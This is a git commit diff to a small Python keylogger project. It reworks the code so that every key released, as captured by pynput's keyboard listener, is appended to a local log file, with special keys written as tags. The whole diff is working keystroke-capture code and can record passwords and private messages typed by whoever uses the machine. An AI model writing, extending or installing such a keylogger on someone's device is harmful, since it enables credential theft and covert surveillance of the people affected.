cc878516c1e8b5cc209c59eb604af5fc8f13d1c6
Alexis Miranda <alexiss._@live.com>
2016-10-02 17:11:46 -0300

    Used normal python functions for writing in logs. Improve encoding.

--- main.py
+++ main.py
@@ -1,24 +1,19 @@
-# -*- coding: latin-1 -*-
+# -*- coding: utf-8 -*-
 from pynput.keyboard import Key
 from pynput.keyboard import Listener
 from modules import KeyLogger
 
-key_logger = KeyLogger()
+key_logger = KeyLogger(name_file='example.log')
 
 
 def on_release(key):
-    if hasattr(key, 'char'):
-        key_logger.append_char(key)
-    elif key == Key.space:
-        key_logger.append_char(' ')
-    else:
-        key_logger.append_key(key)
-        key_logger.send()
+    key_logger.send(key)
     if key == Key.esc:
         return False
 
-
 if __name__ == '__main__':
-    # Collect events until released
-    with Listener(on_release=on_release) as listener:
-        listener.join()
+    try:
+        with Listener(on_release=on_release) as listener:
+            listener.join()
+    finally:
+        key_logger.close()
--- modules/key_logger.py
+++ modules/key_logger.py
@@ -1,22 +1,34 @@
-# -*- coding: latin-1 -*-
-import logging
+# -*- coding: utf-8 -*-
+from pynput.keyboard import Key
 
 class KeyLogger(object):
     """ Send user message """
     def __init__(self, **kwargs):
         self.word = kwargs.get('word', '')
+        self.name_file = kwargs.get('name_file', 'file')
         FORMAT = '%(asctime)-15s %(message)s'
-        logging.basicConfig(filename='example.log', level=logging.DEBUG, format=FORMAT)
 
-    def append_char(self, key):
-        """ Append char to word """
-        self.word += key.char if hasattr(key, 'char') else key
+    def send(self, msg):
+        """ Send message """
+        self.open()
+        self.write(msg)
+        self.close()
 
-    def append_key(self, key):
-        """ Append key to word """
-        self.word += '<{0}>'.format(key.name)
+    def open(self):
+        """ Open connection """
+        self.logging = open(self.name_file, 'a', encoding='utf-8')
 
-    def send(self):
-        """ Send word message """
-        logging.debug(self.word)
-        self.word = ''
+    def write(self, key):
+        """ Write message """
+        if hasattr(key, 'char'):
+            msg = '{0}'.format(key.char)
+        elif key == Key.space:
+            msg = ' '
+        else:
+            msg = '<{0}>\n'.format(key.name)
+
+        self.logging.write(msg)
+
+    def close(self):
+        """ close connection """
+        self.logging.close()
